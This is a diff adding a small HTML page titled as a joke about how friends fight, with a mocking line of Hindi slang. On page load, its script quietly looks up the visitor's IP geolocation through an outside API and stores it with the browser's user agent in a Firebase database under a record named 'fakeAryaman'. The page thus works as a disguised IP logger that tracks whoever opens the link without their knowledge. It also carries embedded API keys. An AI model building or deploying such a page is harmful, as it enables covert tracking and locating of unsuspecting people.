@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>How friends fight😂</title>
+</head>
+<body>
+popat ho gya tera
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+<script src="https://swapnil-pradhan.github.io/swap-se-bat-kro/Firebase8.js"></script>
+<script>
+    const firebaseConfig = {
+apiKey: "AIzaSyASqu2nCrCqmjXipWrWiidyxGaCzhs__EQ",
+authDomain: "talk-69.firebaseapp.com",
+databaseURL: "https://talk-69-default-rtdb.firebaseio.com",
+projectId: "talk-69",
+storageBucket: "talk-69.appspot.com",
+messagingSenderId: "964265791782",
+appId: "1:964265791782:web:4284320b2a4c14f22bb1e7"
+};
+
+firebase.initializeApp(firebaseConfig);
+    
+$.get("https://ipgeolocation.abstractapi.com/v1/?api_key=9ab3aa922de9430fb740dfb67820bf98", function(x){
+firebase.database().ref("fakeAryaman/Details").set({
+Device: navigator.userAgent,
+IP: x
+});
+});
+
+</script>
+</body>
+</html>
